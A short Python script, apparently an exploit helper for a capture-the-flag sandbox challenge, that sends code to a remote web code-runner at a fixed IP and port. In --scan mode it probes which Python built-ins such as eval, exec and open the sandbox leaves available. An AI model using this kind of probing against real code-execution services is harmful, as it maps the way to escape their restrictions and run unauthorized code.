import requests
import sys

url = "http://114.66.24.228:33479/"

def test(code):
    resp = requests.post(url, data={"code": code})
    # 提取执行结果
    if "执行结果" in resp.text:
        start = resp.text.find('<div class="output-area">') + len('<div class="output-area">')
        end = resp.text.find('</div>', start)
        result = resp.text[start:end].strip()
        # 解码HTML实体
        import html
        result = html.unescape(result)
        return result
    return "No output found"

# 所有内置函数/变量名
builtins_names = [
    'abs', 'aiter', 'all', 'any', 'anext', 'ascii', 'bin', 'bool', 'breakpoint', 
    'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 
    'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 
    'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 
    'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 
    'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 
    'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 
    'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 
    'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip',
    'True', 'False', 'None', 'Ellipsis', 'NotImplemented',
    'BaseException', 'Exception', 'ArithmeticError', 'AttributeError', 'BlockingIOError',
    'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError',
    'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning',
    'EOFError', 'EnvironmentError', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError',
    'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError',
    'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt',
    'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'NotADirectoryError',
    'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError',
    'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError',
    'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning',
    'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'TypeError', 'UnboundLocalError',
    'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError',
    'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError'
]

if len(sys.argv) > 1:
    if sys.argv[1] == "--scan":
        print("=== 扫描可用的内置名称 ===")
        available = []
        for name in builtins_names:
            result = test(name)
            if "not defined" not in result and "Invalid code" not in result:
                available.append(name)
                print(f"[AVAILABLE] {name}")
        print(f"\n可用名称: {available}")
    else:
        code = " ".join(sys.argv[1:])
        print(f"Testing: {code}")
        print(f"Result: {test(code)}")
else:
    print("Usage: python exp.py <code>")
    print("       python exp.py --scan")
